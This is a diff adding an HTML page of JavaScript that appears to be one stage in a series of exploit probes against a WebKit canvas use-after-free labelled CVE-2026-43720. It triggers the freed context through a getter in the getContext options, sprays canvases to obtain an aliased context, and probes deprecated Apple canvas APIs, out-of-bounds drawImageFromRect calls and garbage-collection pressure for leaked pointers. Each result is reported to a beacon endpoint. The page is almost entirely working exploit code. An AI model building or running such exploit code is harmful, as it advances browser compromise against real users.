@@ -1,0 +1,431 @@
+<!DOCTYPE html><html><head><meta charset="utf-8">
+<meta http-equiv="Cache-Control" content="no-cache,no-store,must-revalidate">
+<title>p635k</title></head>
+<body><pre id="out">p635k: Canvas UAF — webkit-prefixed APIs + drawImageFromRect + filter</pre>
+<script>
+'use strict';
+/*
+  p635k: CVE-2026-43720 — probe webkit-prefixed non-standard APIs
+  -- prior art: p635j Phase D found: webkitBackingStorePixelRatio,
+     webkitImageSmoothingEnabled, webkitLineDash, webkitLineDashOffset,
+     setAlpha, setCompositeOperation, drawImageFromRect, setStrokeColor,
+     setFillColor, setLineWidth (truncated)
+  -- prior art: all standard API leak paths exhausted (p635b-p635j)
+
+  CRASH_CLASS: MODERATE — drawImageFromRect is deprecated Apple-internal
+
+  Strategy:
+  A) webkitBackingStorePixelRatio: read through alias and inner, check
+     if it exposes backing store info or differs between contexts
+  B) webkitLineDash: set through alias, getLineDash through inner and
+     vice versa — different internal path than standard setLineDash?
+  C) drawImageFromRect: deprecated Apple API, takes (image, sx,sy,sw,sh,
+     dx,dy,dw,dh,compositeOp) — might bypass normal bounds checking
+  D) setStrokeColor/setFillColor/setAlpha: old Apple color APIs that
+     take different argument formats — may expose internal color state
+  E) CSS filter property on canvas: SVG filter effects applied through
+     the alias might expose internal filter graph state
+  F) toDataURL with different formats: image/webp, image/jpeg with
+     quality — encoder might expose internal buffer state
+  G) getContextAttributes: may reveal internal rendering state
+*/
+
+var O = document.getElementById('out');
+function say(s) { O.textContent += '\n' + s; }
+function bk(tag, d) {
+  var msg = 'P635K-' + tag + (d !== undefined ? '-' + String(d).slice(0, 800) : '');
+  say(msg);
+  try {
+    var x = new XMLHttpRequest();
+    x.open('POST', '/api/beacon', false);
+    x.setRequestHeader('Content-Type', 'application/json');
+    x.send(JSON.stringify({stage:'p635k', msg:msg, level:'info', sid:'p635k-'+Date.now(), ua:navigator.userAgent}));
+  } catch(e) {
+    try { new Image().src = '/beacon?m=' + encodeURIComponent(msg) + '&t=' + Date.now(); } catch(e2) {}
+  }
+}
+
+function f64hex(v) {
+  try {
+    var buf = new ArrayBuffer(8);
+    new Float64Array(buf)[0] = v;
+    var u = new Uint32Array(buf);
+    return ((u[1] >>> 0).toString(16)).padStart(8, '0') + ((u[0] >>> 0).toString(16)).padStart(8, '0');
+  } catch(e) { return 'ERR'; }
+}
+
+function isPointerLike(v) {
+  if (typeof v !== 'number' || v !== v) return false;
+  var buf = new ArrayBuffer(8);
+  new Float64Array(buf)[0] = v;
+  var hi = new Uint32Array(buf)[1];
+  return (hi >= 0xFFFF8000 && hi < 0xFFFFFFFF) || (hi >= 0x7F000000 && hi <= 0x7FFFFFFF)
+      || (hi >= 0x00007F00 && hi <= 0x00007FFF) || (hi >= 0x00000001 && hi <= 0x0000FFFF);
+}
+
+bk('START', navigator.userAgent);
+
+function triggerUAF() {
+  var inner = null;
+  var cv = document.createElement('canvas');
+  cv.width = 64; cv.height = 64;
+  var opts = {};
+  Object.defineProperty(opts, 'alpha', {
+    get: function() { inner = cv.getContext('2d'); return true; }
+  });
+  try { cv.getContext('bitmaprenderer', opts); } catch(e) {}
+  return {inner: inner, canvas: cv};
+}
+
+function getAlias(uaf) {
+  var spray = [];
+  for (var i = 0; i < 200; i++) {
+    var c = document.createElement('canvas');
+    c.width = 64; c.height = 64;
+    spray.push({ctx: c.getContext('2d'), canvas: c});
+  }
+  var SENT = Math.random() * 10000 + 1000;
+  try { uaf.inner.lineWidth = SENT; } catch(e) { return null; }
+  for (var i = 0; i < spray.length; i++) {
+    if (spray[i].ctx.lineWidth === SENT) return {alias: spray[i].ctx, aliasCanvas: spray[i].canvas, idx: i, spray: spray};
+  }
+  return null;
+}
+
+// ================================================================
+// PHASE A: webkitBackingStorePixelRatio + other webkit properties
+// ================================================================
+bk('A-START', 'webkit properties');
+var uafA = triggerUAF();
+var aliasA = getAlias(uafA);
+bk('A-ALIAS', aliasA ? 'spray['+aliasA.idx+']' : 'NONE');
+
+if (aliasA) {
+  // webkitBackingStorePixelRatio
+  try {
+    var pr1 = uafA.inner.webkitBackingStorePixelRatio;
+    var pr2 = aliasA.alias.webkitBackingStorePixelRatio;
+    bk('A-BSPR', 'inner=' + pr1 + '(' + f64hex(pr1) + ') alias=' + pr2 + '(' + f64hex(pr2) + ')');
+    if (pr1 !== pr2) bk('A-BSPR-DIFF', 'MISMATCH!');
+    if (isPointerLike(pr1)) bk('A-BSPR-PTR', 'pointer-like!');
+  } catch(e) { bk('A-BSPR', 'ERR:' + e.message.slice(0,40)); }
+
+  // webkitImageSmoothingEnabled
+  try {
+    var s1 = uafA.inner.webkitImageSmoothingEnabled;
+    var s2 = aliasA.alias.webkitImageSmoothingEnabled;
+    bk('A-SMOOTH', 'inner=' + s1 + ' alias=' + s2);
+  } catch(e) { bk('A-SMOOTH', 'ERR:' + e.message.slice(0,40)); }
+
+  // webkitLineDash
+  try {
+    var d1 = uafA.inner.webkitLineDash;
+    bk('A-WKLD', 'type=' + typeof d1 + ' val=' + JSON.stringify(d1).slice(0,60));
+  } catch(e) { bk('A-WKLD', 'ERR:' + e.message.slice(0,40)); }
+
+  // Set webkitLineDash through alias, read through inner
+  try {
+    aliasA.alias.webkitLineDash = [5, 10, 15, 20, 25];
+    var rd = uafA.inner.webkitLineDash;
+    bk('A-WKLD-RD', 'set 5 via alias, inner reads ' + JSON.stringify(rd).slice(0,60));
+    // Also check standard getLineDash
+    var std = uafA.inner.getLineDash();
+    bk('A-WKLD-STD', 'getLineDash=' + JSON.stringify(std).slice(0,60));
+  } catch(e) { bk('A-WKLD-SET', 'ERR:' + e.message.slice(0,40)); }
+
+  // webkitLineDashOffset
+  try {
+    aliasA.alias.webkitLineDashOffset = 12345.6789;
+    var rdo = uafA.inner.webkitLineDashOffset;
+    bk('A-WKLDO', 'set 12345.6789 via alias, inner=' + rdo + '(' + f64hex(rdo) + ')');
+  } catch(e) { bk('A-WKLDO', 'ERR:' + e.message.slice(0,40)); }
+
+  // Enumerate ALL prototype methods with webkit prefix
+  try {
+    var proto = Object.getPrototypeOf(uafA.inner);
+    var allNames = Object.getOwnPropertyNames(proto);
+    var wkNames = allNames.filter(function(n) { return n.indexOf('webkit') === 0 || n.indexOf('set') === 0 || n.indexOf('draw') === 0; });
+    bk('A-WKALL', wkNames.join(','));
+  } catch(e) { bk('A-WKALL', 'ERR'); }
+}
+bk('A-DONE', 'survived');
+
+// ================================================================
+// PHASE B: setStrokeColor / setFillColor / setAlpha (Apple private)
+// ================================================================
+bk('B-START', 'Apple color APIs');
+var uafB = triggerUAF();
+var aliasB = getAlias(uafB);
+bk('B-ALIAS', aliasB ? 'spray['+aliasB.idx+']' : 'NONE');
+
+if (aliasB) {
+  // setFillColor with various argument counts
+  // Apple's API: setFillColor(r,g,b,a) or setFillColor(gray) or setFillColor(gray,a)
+  // or setFillColor(c,m,y,k,a) for CMYK
+  try {
+    aliasB.alias.setFillColor(255, 0, 128, 1.0);
+    var fs = uafB.inner.fillStyle;
+    bk('B-FILL-RGBA', 'setFillColor(255,0,128,1) -> fillStyle=' + fs);
+  } catch(e) { bk('B-FILL-RGBA', 'ERR:' + e.message.slice(0,40)); }
+
+  try {
+    aliasB.alias.setFillColor(0.5);
+    var fs2 = uafB.inner.fillStyle;
+    bk('B-FILL-GRAY', 'setFillColor(0.5) -> fillStyle=' + fs2);
+  } catch(e) { bk('B-FILL-GRAY', 'ERR:' + e.message.slice(0,40)); }
+
+  // CMYK — 5 args
+  try {
+    aliasB.alias.setFillColor(0.1, 0.2, 0.3, 0.4, 1.0);
+    var fs3 = uafB.inner.fillStyle;
+    bk('B-FILL-CMYK', 'setFillColor(CMYK) -> fillStyle=' + fs3);
+  } catch(e) { bk('B-FILL-CMYK', 'ERR:' + e.message.slice(0,40)); }
+
+  // setStrokeColor
+  try {
+    aliasB.alias.setStrokeColor(0, 255, 0, 0.5);
+    var ss = uafB.inner.strokeStyle;
+    bk('B-STROKE', 'setStrokeColor(0,255,0,0.5) -> strokeStyle=' + ss);
+  } catch(e) { bk('B-STROKE', 'ERR:' + e.message.slice(0,40)); }
+
+  // setAlpha
+  try {
+    aliasB.alias.setAlpha(0.42);
+    var ga = uafB.inner.globalAlpha;
+    bk('B-ALPHA', 'setAlpha(0.42) -> globalAlpha=' + ga + '(' + f64hex(ga) + ')');
+  } catch(e) { bk('B-ALPHA', 'ERR:' + e.message.slice(0,40)); }
+
+  // setCompositeOperation
+  try {
+    aliasB.alias.setCompositeOperation('xor');
+    var gco = uafB.inner.globalCompositeOperation;
+    bk('B-COMP', 'setCompositeOperation(xor) -> gco=' + gco);
+  } catch(e) { bk('B-COMP', 'ERR:' + e.message.slice(0,40)); }
+
+  // setLineWidth / setLineCap / setLineJoin / setMiterLimit
+  try {
+    if (aliasB.alias.setLineWidth) {
+      aliasB.alias.setLineWidth(77.77);
+      bk('B-SLW', 'setLineWidth(77.77) -> inner.lineWidth=' + uafB.inner.lineWidth);
+    }
+  } catch(e) { bk('B-SLW', 'ERR:' + e.message.slice(0,40)); }
+
+  // setShadow (Apple private: x, y, blur, color)
+  try {
+    if (aliasB.alias.setShadow) {
+      aliasB.alias.setShadow(10, 20, 30, 'red');
+      bk('B-SHADOW', 'sox=' + uafB.inner.shadowOffsetX + ' soy=' + uafB.inner.shadowOffsetY +
+         ' sb=' + uafB.inner.shadowBlur + ' sc=' + uafB.inner.shadowColor);
+    } else {
+      bk('B-SHADOW', 'setShadow not available');
+    }
+  } catch(e) { bk('B-SHADOW', 'ERR:' + e.message.slice(0,40)); }
+}
+bk('B-DONE', 'survived');
+
+// ================================================================
+// PHASE C: drawImageFromRect (deprecated Apple API)
+// ================================================================
+bk('C-START', 'drawImageFromRect');
+var uafC = triggerUAF();
+var aliasC = getAlias(uafC);
+bk('C-ALIAS', aliasC ? 'spray['+aliasC.idx+']' : 'NONE');
+
+if (aliasC) {
+  // Create source with pattern
+  var src = document.createElement('canvas');
+  src.width = 64; src.height = 64;
+  var sctx = src.getContext('2d');
+  sctx.fillStyle = '#DE00BE';
+  sctx.fillRect(0, 0, 64, 64);
+
+  // drawImageFromRect(image, sx, sy, sw, sh, dx, dy, dw, dh, compositeOp)
+  try {
+    if (aliasC.alias.drawImageFromRect) {
+      // Normal use through alias
+      aliasC.alias.drawImageFromRect(src, 0, 0, 64, 64, 0, 0, 64, 64, 'copy');
+      var px = uafC.inner.getImageData(0, 0, 64, 64);
+      bk('C-NORMAL', 'px[0]=' + px.data[0]+','+px.data[1]+','+px.data[2]+','+px.data[3]);
+
+      // OOB source rect — might read past canvas backing buffer
+      aliasC.alias.drawImageFromRect(src, -100, -100, 264, 264, 0, 0, 64, 64, 'copy');
+      var px2 = uafC.inner.getImageData(0, 0, 64, 64);
+      var nonDE = 0;
+      var samples = [];
+      for (var i = 0; i < px2.data.length; i += 4) {
+        if (px2.data[i] !== 0xDE || px2.data[i+1] !== 0 || px2.data[i+2] !== 0xBE) {
+          nonDE++;
+          if (samples.length < 5) samples.push('px['+(i/4)+']='+px2.data[i]+','+px2.data[i+1]+','+px2.data[i+2]+','+px2.data[i+3]);
+        }
+      }
+      bk('C-OOB', nonDE + ' non-pattern' + (samples.length > 0 ? ' ' + samples.join(' ') : ''));
+
+      // Check f64 for pointers in OOB pixels
+      var fv = new Float64Array(px2.data.buffer);
+      var ptrs = [];
+      for (var j = 0; j < fv.length; j++) {
+        if (isPointerLike(fv[j])) {
+          ptrs.push('['+j+']='+f64hex(fv[j]));
+          if (ptrs.length >= 5) break;
+        }
+      }
+      bk('C-PTR', ptrs.length > 0 ? ptrs.join(' ') : 'no pointers');
+
+      // Draw from UAF canvas to itself — self-reference through confused state
+      aliasC.alias.drawImageFromRect(uafC.canvas, 0, 0, 64, 64, 0, 0, 64, 64, 'source-over');
+      bk('C-SELF', 'self-draw survived');
+
+      // Use the UAF canvas as source but read through alias canvas
+      try {
+        var px3 = aliasC.alias.getImageData(0, 0, 64, 64);
+        bk('C-ALIAS-PIX', 'px[0]=' + px3.data[0]+','+px3.data[1]+','+px3.data[2]+','+px3.data[3]);
+      } catch(e3) { bk('C-ALIAS-PIX', 'ERR:' + e3.message.slice(0,40)); }
+    } else {
+      bk('C-ABSENT', 'drawImageFromRect not available');
+    }
+  } catch(e) { bk('C-ERR', e.message.slice(0,60)); }
+}
+bk('C-DONE', 'survived');
+
+// ================================================================
+// PHASE D: CSS filter property
+// ================================================================
+bk('D-START', 'CSS filter');
+var uafD = triggerUAF();
+var aliasD = getAlias(uafD);
+bk('D-ALIAS', aliasD ? 'spray['+aliasD.idx+']' : 'NONE');
+
+if (aliasD) {
+  // Check if filter is supported
+  try {
+    bk('D-FILTER', 'default filter=' + (uafD.inner.filter || 'undefined'));
+  } catch(e) { bk('D-FILTER', 'ERR:' + e.message.slice(0,40)); }
+
+  // Set filter through alias, read through inner
+  var filters = [
+    'blur(5px)',
+    'brightness(2)',
+    'contrast(200%)',
+    'drop-shadow(0 0 10px black)',
+    'grayscale(100%)',
+    'hue-rotate(90deg)',
+    'invert(100%)',
+    'saturate(300%)',
+    'sepia(100%)',
+    'url(#nonexistent)',
+  ];
+
+  for (var i = 0; i < filters.length; i++) {
+    try {
+      aliasD.alias.filter = filters[i];
+      var readFilter = uafD.inner.filter;
+      bk('D-F-'+i, '"' + filters[i].slice(0,25) + '" -> "' + (readFilter || 'undef').slice(0,40) + '"');
+    } catch(e) { bk('D-F-'+i, 'ERR:' + e.message.slice(0,30)); }
+  }
+
+  // Draw with active filter through alias, read pixels through inner
+  try {
+    aliasD.alias.filter = 'blur(0px)';
+    aliasD.alias.fillStyle = '#deadbe';
+    aliasD.alias.fillRect(0, 0, 64, 64);
+    var px = uafD.inner.getImageData(0, 0, 1, 1);
+    bk('D-PIX', 'after filter draw px[0]=' + px.data[0]+','+px.data[1]+','+px.data[2]+','+px.data[3]);
+  } catch(e) { bk('D-PIX', 'ERR:' + e.message.slice(0,40)); }
+}
+bk('D-DONE', 'survived');
+
+// ================================================================
+// PHASE E: toDataURL / toBlob with various formats
+// ================================================================
+bk('E-START', 'toDataURL formats');
+var uafE = triggerUAF();
+if (uafE.inner && uafE.canvas) {
+  uafE.inner.fillStyle = '#deadbe';
+  uafE.inner.fillRect(0, 0, 64, 64);
+
+  var formats = ['image/png', 'image/jpeg', 'image/webp', 'image/bmp', 'image/gif'];
+  for (var i = 0; i < formats.length; i++) {
+    try {
+      var url = uafE.canvas.toDataURL(formats[i], 0.01);
+      bk('E-FMT-'+i, formats[i] + ' len=' + url.length + ' hdr=' + url.slice(0,40));
+    } catch(e) { bk('E-FMT-'+i, formats[i] + ' ERR:' + e.message.slice(0,40)); }
+  }
+
+  // toDataURL with extreme quality values
+  try {
+    var url99 = uafE.canvas.toDataURL('image/jpeg', 99999);
+    bk('E-EXTREME', 'jpeg q=99999 len=' + url99.length);
+  } catch(e) { bk('E-EXTREME', 'ERR:' + e.message.slice(0,40)); }
+}
+bk('E-DONE', 'survived');
+
+// ================================================================
+// PHASE F: getContextAttributes
+// ================================================================
+bk('F-START', 'getContextAttributes');
+var uafF = triggerUAF();
+var aliasF = getAlias(uafF);
+bk('F-ALIAS', aliasF ? 'spray['+aliasF.idx+']' : 'NONE');
+
+if (aliasF) {
+  try {
+    var attrs1 = uafF.inner.getContextAttributes();
+    bk('F-INNER', JSON.stringify(attrs1));
+  } catch(e) { bk('F-INNER', 'ERR:' + e.message.slice(0,40)); }
+
+  try {
+    var attrs2 = aliasF.alias.getContextAttributes();
+    bk('F-ALIAS-ATTR', JSON.stringify(attrs2));
+  } catch(e) { bk('F-ALIAS-ATTR', 'ERR:' + e.message.slice(0,40)); }
+
+  // Check if attributes differ
+  try {
+    var a1 = JSON.stringify(uafF.inner.getContextAttributes());
+    var a2 = JSON.stringify(aliasF.alias.getContextAttributes());
+    bk('F-MATCH', a1 === a2 ? 'SAME' : 'DIFFER: inner=' + a1 + ' alias=' + a2);
+  } catch(e) { bk('F-MATCH', 'ERR'); }
+}
+bk('F-DONE', 'survived');
+
+// ================================================================
+// PHASE G: Rapid create/destroy cycle — GC pressure info leak
+// ================================================================
+bk('G-START', 'GC pressure');
+var uafG = triggerUAF();
+var aliasG = getAlias(uafG);
+bk('G-ALIAS', aliasG ? 'spray['+aliasG.idx+']' : 'NONE');
+
+if (aliasG) {
+  // Create many objects to trigger GC, then read doubles for stale data
+  for (var round = 0; round < 3; round++) {
+    // Allocate + discard
+    for (var i = 0; i < 5000; i++) {
+      var tmp = {a: new ArrayBuffer(256), b: new Float64Array(32), c: 'x'.repeat(100)};
+    }
+    // Force potential GC
+    try {
+      if (typeof gc === 'function') gc();
+    } catch(e) {}
+
+    // Read doubles through inner
+    var vals = {};
+    try { vals.lw = uafG.inner.lineWidth; } catch(e) {}
+    try { vals.ml = uafG.inner.miterLimit; } catch(e) {}
+    try { vals.ga = uafG.inner.globalAlpha; } catch(e) {}
+    try { var t = uafG.inner.getTransform(); vals.ta = t.a; vals.td = t.d; vals.te = t.e; vals.tf = t.f; } catch(e) {}
+
+    var anomalies = [];
+    if (vals.lw !== aliasG.spray[aliasG.idx].ctx.lineWidth) anomalies.push('lw');
+    if (vals.ta !== 1) anomalies.push('ta=' + f64hex(vals.ta));
+    if (vals.td !== 1) anomalies.push('td=' + f64hex(vals.td));
+    if (vals.te !== 0) anomalies.push('te=' + f64hex(vals.te));
+    if (vals.tf !== 0) anomalies.push('tf=' + f64hex(vals.tf));
+
+    bk('G-R'+round, anomalies.length > 0 ? 'ANOMALY: ' + anomalies.join(' ') : 'clean');
+  }
+}
+bk('G-DONE', 'survived');
+
+bk('DONE', 'all phases complete');
+</script>
+</body></html>
